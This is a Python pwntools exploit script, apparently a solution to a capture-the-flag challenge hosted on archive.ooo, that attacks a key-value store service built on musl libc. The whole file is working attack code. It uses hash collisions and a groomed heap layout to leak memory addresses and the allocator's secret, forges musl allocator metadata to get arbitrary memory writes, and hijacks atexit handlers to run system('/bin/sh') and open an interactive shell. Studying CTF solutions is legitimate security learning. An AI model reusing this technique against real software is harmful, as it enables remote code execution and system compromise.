from pwn import *


# 'aaa', 'afl', 'akw' all result in the same hash
def hash(bs):
    res = 0x7e5
    for b in bs:
        res = (b + res * 0x13377331) & 0xFF_FF_FF_FF
    return res


def parse_leak(content):
    leak = bytes.fromhex(content.split(b':')[1].decode())
    nums = [u64(leak[idx:idx + 8]) for idx in range(0, len(leak), 8)]
    return nums


class Pwnable:
    def __init__(self):
        # this is a private instance I spawned on archive.ooo
        # if you want to repeat this, spawn another one
        #self.p = remote('54.218.163.162', '23333')
        self.p = remote('172.17.0.2', '23333')

    def send_bytes(self, b):
        self.p.recvuntil(b'size: ')
        self.p.sendline(f'{len(b)}')
        self.p.recvuntil(b'content: ')
        self.p.send(b)

    def store(self, key, value):
        self.p.recvuntil(b'option: ')
        self.p.sendline(b'1')
        self.send_bytes(key)
        self.send_bytes(value)
        self.p.recvuntil(b'ok')

    def query(self, key):
        self.p.recvuntil(b'option: ')
        self.p.sendline(b'2')
        self.send_bytes(key)
        res = self.p.recvuntil(b'ok')
        return res.rstrip(b'\nok')

    def delete(self, key):
        self.p.recvuntil(b'option: ')
        self.p.sendline(b'3')
        self.send_bytes(key)
        self.p.recvuntil(b'ok')

    def exit(self):
        self.p.recvuntil(b'option: ')
        self.p.sendline(b'4')
        self.p.recvuntil(b'bye')


if __name__ == '__main__':
    p = Pwnable()

    elem_len = 0x30
    # group #0
    p.store(b'0', b'0' * elem_len)
    p.store(b'1', b'1' * elem_len)
    p.store(b'2', b'2' * elem_len)

    p.store(
        b'aaa',
        # group #1
        b'A' * elem_len
    )
    p.store(b'afl', b'F' * elem_len)
    p.store(b'3', b'3' * elem_len)
    p.store(b'4', (b'akw' * elem_len)[:elem_len])

    # group #2
    p.store(b'5', b'5' * elem_len)

    p.delete(b'aaa')
    p.delete(b'3')
    p.delete(b'5')

    p.store(b'6', b'0' * 128)
    brk_leak, mmap_leak, *_ = parse_leak(p.query(b'aaa'))

    print(f'brk leak: {hex(brk_leak)}')
    print(f'mmap leak: {hex(mmap_leak)}')

    fake_secret_addr = mmap_leak - 0xd7a70 + 0x1000
    fake_meta_addr = fake_secret_addr + 0x8
    fake_group_addr = fake_meta_addr + 0x28
    fake_akw_addr = fake_group_addr + 0x10

    # fake_aaa leaks the global context secret
    fake_aaa = flat([
        # key_ptr -> "aaa"
        brk_leak - 0x80,
        # value_ptr -> ctx.secret
        mmap_leak - 0x2fb0,
        # key_size
        3,
        # value_size = sizeof(ctx.secret)
        8,
        # key_hash
        hash(b'aaa'),
        # next
        fake_akw_addr,
    ], word_size=64)
    p.store(b'7' * elem_len, fake_aaa)

    secret_leak, *_ = parse_leak(p.query(b'aaa'))
    print(f'secret leak: {hex(secret_leak)}')

    # musl refuses to immediately reuse freed elements
    # so we have to make an elaborate allocation pattern
    # we allocated 3 groups of 7 slots each and freed/reused some of those
    # after this line, these slots look like this

    # GROUP #0
    # 0 elem 0
    # 1 0...0
    # 2 elem 1
    # 3 1...1
    # 4 elem 2
    # 5 2...2
    # 6 elem aaa    [x] reused for elem 7 value (fake_aaa)
    # GROUP #1
    # 0 A...A       [x] reused for elem 6 (brk/mmap leak)
    # 1 elem afl
    # 2 F...F
    # 3 elem 3      [x] reused for elem 7
    # 4 3...3       [x] reused for elem 7 key
    # 5 elem 4
    # 6 akw...akw
    # GROUP #2
    # 0 elem 5      [x] these are only needed to make musl
    # 1 5...5       [x] reuse slots from group #1

    # fake_aaa->next points to fake_akw, which we place in a large mmap()ed allocation
    # our end goal is to craft fake_{akw,meta} to obtain write-what-where
    fake_alloc_size = 32 * 4096 - 16 - 4
    fake_meta = flat([
        # prev
        0,
        # next
        0,
        # meta->mem
        fake_group_addr,
        # avail_mask | freed_mask
        0,
        # sizeclass, shifted to skip last_idx and freeable
        5 << 6,
    ], word_size=64)
    fake_akw = flat([
        # key_ptr -> "akw"
        mmap_leak - 0x80,
        # value_ptr
        0,
        # key_size,
        3,
        # value_ptr
        0,
        # key_hash
        hash(b'akw'),
        # next
        0,
    ], word_size=64)
    fake_alloc = flat([
        b'\x00' * (0x1000 - 0x10),
        secret_leak,
        fake_meta,
        # group->meta
        fake_meta_addr,
        # group->{active_idx,pad}
        0,
        fake_akw,
    ], word_size=64)

    # mmap() a large allocation
    p.store(b'8', fake_alloc.ljust(fake_alloc_size, b'\x00'))
    # free() fake_akw to place our fake meta on the active group list
    p.delete(b'akw')
    # munmap() the large allocation so that it can be written to again below
    p.delete(b'8')

    # stomp over the fake meta in order to point to addr, which we want to overwrite
    def create_meta_stomper(addr):
        return flat([
            b'\x00' * (0x1000 - 0x8),
            [
                # prev
                fake_meta_addr,
                # next
                fake_meta_addr,
                # make meta point to struct group
                # then, group->mem will be set to addr
                addr - 0x10,
                # freed_mask = 0, avail_mask = 1
                1,
                # the same size class
                5 << 6,
            ],
        ], word_size=64).ljust(fake_alloc_size, b'\x00')

    malloc_replaced_addr = mmap_leak - 0xaec
    # mmap() will return the same large allocation as before
    # this is what allows us to stomp over the fake meta we crafted before
    # first, we want to enable __malloc_replaced, which disables __malloc_allzerop() in calloc()
    # otherwise, __malloc_allzerop() crashes while validating the meta
    p.store(b'8', create_meta_stomper(malloc_replaced_addr + 0x4))
    # when allocating the value, set_size() will write a non-zero value to p[-3]
    # and we arranged p[-3] to point inside __malloc_replaced
    p.store(b'9', b'\x00' * 0x50)

    # with __malloc_allzerop() disabled, we finally have write-what-where
    # use it multiple times to create a fake atexit() handler
    builtin_atexit_addr = mmap_leak - 0x3410
    system_addr = mmap_leak - 0x66fe0
    bin_sh_addr = mmap_leak - 0x4899
    what_where = [
        # builtin->f[0]
        ([system_addr], builtin_atexit_addr + 0x8),
        # builtin->a[0]
        ([bin_sh_addr], builtin_atexit_addr + 33 * 0x8),
        # the head of the linked list of atexit() handlers
        ([builtin_atexit_addr], mmap_leak - 0xd28),
        # the number of atexit handlers
        ([0] * 9 + [1], mmap_leak - 0xb0c - 0x48),
    ]
    for what, where in what_where:
        p.delete(b'8')
        p.store(b'8', create_meta_stomper(where))
        p.store(b'9', flat(what, word_size=64).ljust(0x50, b'\x00'))

    # trigger the fake atexit() handler
    p.exit()
    p.p.interactive()
